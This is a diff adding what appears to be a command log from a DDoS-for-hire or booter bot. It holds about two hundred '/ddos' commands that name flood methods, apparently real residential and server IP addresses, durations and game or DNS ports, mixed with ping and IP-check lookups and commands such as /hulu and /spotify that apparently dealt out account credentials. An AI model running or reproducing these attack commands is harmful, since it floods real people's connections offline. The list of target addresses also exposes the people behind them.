@@ -1,0 +1,228 @@
+/accounts
+/xboxcode
+/ddos udp 67.175.212.235 100
+/hulu
+/hulu
+/check ip 98.233.121.64
+/checkip 73.2.182.119
+/ddos udp 73.2.182.119
+/ddos udp 104.230.75.76
+/ddos udp 97.99.154.156 1200
+/ddos udp 151.228.131.145 1200
+/ddos udp 151.228.131.145 dport=80
+/ddos udp 24.12.159.2 1200
+/ddos std 24.12.159.2 1200 dport=80
+/ddos udp 68.207.148.245 1200 dport=80
+/ping 68.207.148.245
+/ddos 75.182.125.152 500 dport=53
+/ddos udp 75.182.125.152 400 dport=53
+/ddos std 162.198.221.184 1200 dport=1033
+/check ip 162.198.221.184
+/ddos udp 24.96.158.190 200 dport=53
+/ddos udp 24.7.204.33 500 dport=53
+/ping 24.7.204.33
+/ddos std 99.61.141.217 1200
+/ping 99.61.141.217
+/ddos std 173.169.187.27 1200 dport=53
+/ping 173.169.187.27
+/ddos dns 173.169.187.27 400 dport=3074
+/ping 173.169.187.27
+/ddos std 99.234.32.76 1200
+/ping 99.234.32.76
+/ddos std 99.234.32.76 600 dport=80
+/ping 99.234.32.76
+/ddos udp 67.242.212.91 400 dport=53
+/ping 67.242.212.91
+/ping 67.242.212.91
+/ddos std 71.143.145.42 1200 dport=53
+/ping 71.143.145.42
+/check ip 71.143.145.42
+/ddos udp 71.143.145.42 1200 dport=53
+/ddos udp 71.143.145.42 800 dport=53
+/ping 71.143.145.42
+/ddos udp 99.101.82.248 1200 dport=80
+/ping 99.101.82.248
+/ping 99.101.82.248
+/ddos udp 24.194.107.54 1200 dport53
+/ddos udp 24.194.107.54 1200 dport=53
+/ping 24.194.107.54
+/methods
+/ddos ovh 147.135.26.156 1200 dport=443
+/ping 147.135.26.156
+/ping 147.135.26.156
+/ddos udp 50.126.201.14 1200 dport=80
+/ping 50.126.201.14
+/ddos udp 76.212.59.128 1200 dport=53
+/ping 76.212.59.128
+/ping 76.212.59.128
+/ddos std 50.126.201.14 1200 dport=3074
+/methods
+/ddos stdhex 74.91.119.228 500 dport=443
+/ping 74.91.119.228
+/ddos stdhex 500 dport=443
+/ddos std 104.153.108.102 500 dport=443
+/ddos stdhex 104.153.108.102 500 dport=443
+/ddos ovh 104.153.108.102 500 dport=443
+/ddos udp 70.119.97.210 1200 dport=53
+/ddos udp 98.165.102.205 500 dport=80
+/ddos udp 66.176.102.250 500 dport=53
+/ping 66.176.102.250
+/ddos udp 104.230.75.76 30 dport=80
+/ping 104.230.75.76
+/ddos udp 104.230.75.76 500 dport=80
+/ping 104.230.75.76
+/ddos udp 104.230.75.76 400 dport=80
+/ddos std 104.230.75.76 400 dport=443
+/ping 104.230.75.76
+/ddos std 98.233.76.222 1200 dport=53
+/ddos udp 66.190.77.87 1200 dport=53
+/ddos udp 174.109.120.207 400 dport=53
+/ping 174.109.120.207
+/methods
+/ddos std 73.136.53.70 1200 dport=53
+/ping 73.136.53.70
+/ddos std 73.136.53.70 1200 dport=53
+/ddos std 69.140.49.14 1200 dport=53
+/ddos std 76.76.76.8 500 dport=80
+/spotify
+/spotify
+/ddos udp 76.76.76.32 400 dport-80
+/ddos std 108.222.50.151 400 dport=80
+/methods
+/ddos udp 75.142.8.51 500 dport=80
+/ddos udp 73.172.56.35 40 dport=53
+/ddos udp 69.251.77.56 400 dport=80
+/ddos udp 73.172.56.35 10 dport=53
+/plan
+/ddos udp 104.230.75.76 400 dport=80
+/ping 104.230.75.76
+/ddos udp 138.128.137.100 300 dport=80
+/ddos std 138.128.137.100 400 dport=80
+/ddos ovh 198.251.83.233 500 dport=41100
+/methods
+/ddos stdhex 74.91.119.228 300 dport=41100
+/ddos ovh 74.91.119.228 300 dport=41100
+/ddos udp 74.71.155.246 5 dport=80
+/ddos 67.242.212.91 400 dport=80
+/ddos udp 67.242.212.91 dport=80
+/ddos std 67.242.212.91  300 dport=80
+/ddos udp 71.127.145.197 300 dport=53
+/ddos udp 98.233.121.64 10 dport=53
+/ddos udp 98.233.121.64 50 dport=53
+/ddos udp 172.107.224.114 300 dport=80
+/ddos udp 98.233.177.12 400 dport=80
+/ddos udp 166.170.28.24 1200 dport=80
+/ddos udp 73.213.167.178 600 dport=53
+/ddos std 73.213.167.178 1200 dport=53
+/ddos udp 73.29.16.84 10 dport=53
+/ddos std 73.29.16.84 1200 dport=53
+/ddos std 108.222.50.151 60 dport=80
+/ddos std 108.222.50.151 100 dport=80
+/ddos std 108.222.50.151 1200 dport=80
+/ddos std 104.230.75.76 300 dport=80
+/ddos std 71.213.13.34 1200 dport=53
+/ddos std 75.176.121.56 5 dport=53
+/ddos std 71.213.13.34 1200 dport=53
+/ddis std 24.96.158.190 5 dport=53
+/ddos std 24.96.158.190 5 dport=53
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/ddos std 98.233.121.64 5 dport=53
+/ddos std 104.8.28.162  300 dport=80
+/ddos std 172.58.27.115 1200 dport=443
+/ddos std 75.16.166.91 200 dport=53
+/ddos std 73.13.106.81 600 dport=53
+/ping 73.13.106.81
+/ping 73.13.106.81
+/ddos std 107.220.25.45 1200 dport=80
+/ddos std 107.220.25.45 1200 dport=80
+/ddos std 104.175.71.10 1200 dport=80
+/ddos std 99.185.98.222 1200 dport=80
+/ddos std 69.221.118.61 1200 dport=80
+/ddos std 99.254.88.213 400 dport=80
+/ddos std 73.213.13.34 1200 dport=53
+/ddos std 104.138.218.107 1200 dport=80
+/ddos std 73.12.48.238 400 dport=53
+/ddos std 73.133.27.112 5 dport=53
+/ddos std 73.133.27.112 5 dport=53
+/ddos std 73.133.27.112 5 dport=53
+/ddos std 73.133.27.112 20 dport=53
+/lag std 73.133.27.112 120 dport=53
+/ddos std 73.133.27.112 1200 dport=53
+/ddos std 65.34.118.149 400 dport=53
+/ddos std 65.34.118.149 1200 dport=53
+/ddos ovh 38.121.43.8 5 dport=102
+/ddos std 69.243.188.133 1200 dport=53
+/ddos udp 69.243.188.133 1200 dport=53
+/ddos std 199.115.144.146 1200 dport=80
+/ddos std 199.115.144.146 1200 dport=3074
+/ddos std 69.255.132.196 1200 dport=53
+/ddos std 45.24.52.52 1200 dport=80
+/ddos std 73.133.27.112 1200 dport=53
+/ddos std 98.233.121.64 300 dport=53
+/methods
+/ddos std 38.91.107.34 5 dport=80
+/ddos std 38.91.107.34 1200 dport=80
+/ddos std 173.92.162.107 1200 dport=53
+/ddos std 173.92.162.107 5 dport=53
+/ddos std 24.96.158.190 5 dport=53
+/ddos std 24.96.158.190 100 dport=53
+/ddos std 47.24.4.88 1200 dport=80
+/ddos std 69.137.214.81 1200 dport=53
+/ddos std 70.71.112.144 1200 dport=53
+/ddos ovh 104.153.108.102 120 dport=80
+/ddos std 162.248.94.195 1200 dport=41100
+/ddos std 71.50.168.41 1200 dport=53
+/ddos std 98.254.117.114 400 dport=53
+/ddos std 216.135.49.112 200 dport=80
+/ddos std 216.135.49.112 1220 dport=3074
+/ddos std 216.135.49.112 1200 dport=3074
+/ddos std 73.194.220.108 1200 dport=53
+/ddos std 38.68.135.212 200 dport=443
+/ddos std 68.61.236.106 1200 dport=53
+/ddos std 71.75.12.113 1200 dport=53
+/ddos std 71.75.12.113 1200 dport=53
+/ddos std 71.75.13.168 1200 dport=53
+/ddos std 98.233.121.64 120 dport=53
+/ddos std 98.233.121.64 200 dport=53
+/ddos std 66.18.44.231 120 dport=80
+/ddos std 64.56.24.223 1200 dport=80
+/ddos std 71.75.13.168 1200 dport=53
+/ddos std 76.226.174.11 1200 dport=53
+/ddos std 72.238.187.71 1200 dport=80
+/ddos std 69.249.122.104 1200 dport=53
+/ddos udp 69.249.122.104 1200 dport=53
+/ddos std 71.62.22.193 400 dport=53
+/ddos mstd 71.62.22.193 400 dport=53
+/ddos std 74.71.155.246 800 dport=53
+/ddos std 73.133.27.112 1200 dport=53
+/ddos std 76.101.137.145 1200 dport=53
+/ddos std 76.101.137.145 1200 dport=53
+/ddos std 75.36.193.225 1200 dport=53
+/ddos std 47.12.77.94 1200 dport=80
+/ddos std 72.88.153.109 1200 dport=80
+/ddos std 72.88.153.109 1200 dport=80
+/ddos std 172.58.23.191 700 dport=80
+/methods
+/ddos tcp 91.220.101.134 1200 dport=443
+/ddos tcp 91.220.101.134 1200 dport=443
+/ddos tcp 91.220.101.134 700
+/ddos std 67.163.21.86 1200 dport=53
+/ddos std 74.71.155.246 5 dport=53
+/ddos std 74.91.122.159 1200 dport=80
+/ddos std 71.91.115.24 1200
+/ddos std 91.125.63.147 1200 dport=53
+/ddos std 83.255.209.243 1200 dport=3074
+/ddos std 83.255.209.243 1200 dport=80
+/ddos std 74.131.143.221 1200 dport=53
+/ddos std 73.136.53.70 1200 dport=53
+/ddos std 174.110.163.77 500
+/ddos std 76.110.1.227 1200 dport=53
+/ddos std 104.230.75.76 400
+/ddos std 104.230.75.76 30
